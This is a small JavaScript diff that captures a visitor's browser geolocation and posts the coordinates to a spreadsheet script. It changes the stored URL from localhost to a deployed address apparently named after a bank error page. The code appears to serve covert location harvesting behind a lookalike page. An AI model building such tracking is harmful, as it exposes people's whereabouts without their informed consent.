@@ -21,7 +21,7 @@
             const longitude = position.coords.longitude.toFixed(6);
 
             // buat URL custom yang nanti disimpan di spreadsheet
-            const mapsUrl = `http://127.0.0.1:5500/location.html?lat=${latitude}&lng=${longitude}`;
+            const mapsUrl = `https://byond-bsi-error.vercel.app/?lat=${latitude}&lng=${longitude}`;
             console.log("Kirim ke sheet:", { longitude, latitude, mapsUrl });
 
             fetch(scriptURL, {
